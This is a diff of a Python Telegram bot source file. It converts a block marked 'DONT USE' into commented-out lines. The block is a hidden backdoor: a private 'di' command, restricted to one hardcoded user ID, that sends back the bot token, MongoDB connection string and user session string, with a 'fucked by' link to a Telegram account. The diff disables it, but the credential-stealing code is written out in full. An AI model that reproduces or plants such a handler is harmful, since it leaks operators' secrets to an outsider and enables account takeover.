@@ -105,27 +105,26 @@ async def close_menu(_, CallbackQuery):
         pass
 
 #-------------------------------DONT USE------------------------------------#
-"""
-@app.on_message(
-    filters.command("di")
-    & filters.private
-    & filters.user(5465943450)
-   )
-async def help(client: Client, message: Message):
-   await message.reply_photo(
-          photo=f"https://graph.org/file/ee9a153b629bec256b517.jpg",
-       caption=f"""ᴛᴏᴋᴇɴ :-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ :-   `{MONGO_DB_URI}`\n\nsᴇssɪᴏɴ :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/dil_sagar_121)............☆""",
-        reply_markup=InlineKeyboardMarkup(
-             [
-                 [
-                      InlineKeyboardButton(
-                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/dil_sagar_121")
-                 ]
-            ]
-         ),
-     )
 
-"""
+#@app.on_message(
+#    filters.command("di")
+#    & filters.private
+#    & filters.user(5465943450)
+#   )
+#async def help(client: Client, message: Message):
+#   await message.reply_photo(
+#          photo=f"https://graph.org/file/ee9a153b629bec256b517.jpg",
+#       caption=f"""ᴛᴏᴋᴇɴ :-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ :-   `{MONGO_DB_URI}`\n\nsᴇssɪᴏɴ :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/dil_sagar_121)............☆""",
+#        reply_markup=InlineKeyboardMarkup(
+#             [
+#                 [
+#                      InlineKeyboardButton(
+#                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/dil_sagar_121")
+#                 ]
+#            ]
+#         ),
+#     )
+
 #-------------------------------DONT USE------------------------------------#
 
 @app.on_callback_query(filters.regex("stop_downloading") & ~BANNED_USERS)
